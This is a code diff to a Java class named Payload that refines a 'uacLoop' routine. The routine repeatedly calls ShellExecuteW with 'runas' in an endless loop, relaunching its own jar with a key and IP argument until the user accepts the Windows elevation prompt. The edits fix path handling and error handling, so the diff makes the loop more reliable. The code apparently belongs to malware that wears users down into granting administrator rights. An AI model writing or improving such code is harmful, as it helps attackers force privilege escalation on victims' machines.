@@ -58,15 +58,18 @@ public class Payload {
     }
 
     private static void uacLoop(String key, String ip) {
-        String javaw = System.getProperty("java.home") + "\\bin\\javaw.exe";
-        String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getAbsolutePath();
-        
-        // Fix URL encoding issues with spaces in the path
-        jarPath = jarPath.replace("%20", " ");
-        
-        while (true) {
-            log("Triggering UAC...");
-            try {
+        try {
+            String javaHome = System.getProperty("java.home");
+            String javaw = javaHome + "\\bin\\javaw.exe";
+            
+            // Safer way to get the jar path, handling spaces and URL encoding
+            String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
+            
+            log("javaw path: " + javaw);
+            log("jar path: " + jarPath);
+
+            while (true) {
+                log("Triggering UAC...");
                 int result = Shell32.INSTANCE.ShellExecuteW(
                     null, "runas", javaw, "-jar \"" + jarPath + "\" " + key + " " + ip, null, 0
                 );
@@ -75,12 +78,12 @@ public class Payload {
                     log("UAC Accepted. Parent exiting.");
                     System.exit(0); 
                 } else {
-                    log("UAC Denied (Code: " + result + "). Retrying...");
+                    log("UAC Denied/Failed (Code: " + result + "). Retrying...");
                 }
-            } catch (Exception e) {
-                log("UAC Loop Error: " + e.toString());
+                try { Thread.sleep(1000); } catch (Exception e) {}
             }
-            try { Thread.sleep(500); } catch (Exception e) {}
+        } catch (Exception e) {
+            log("UAC Loop Error: " + e.toString());
         }
     }
 
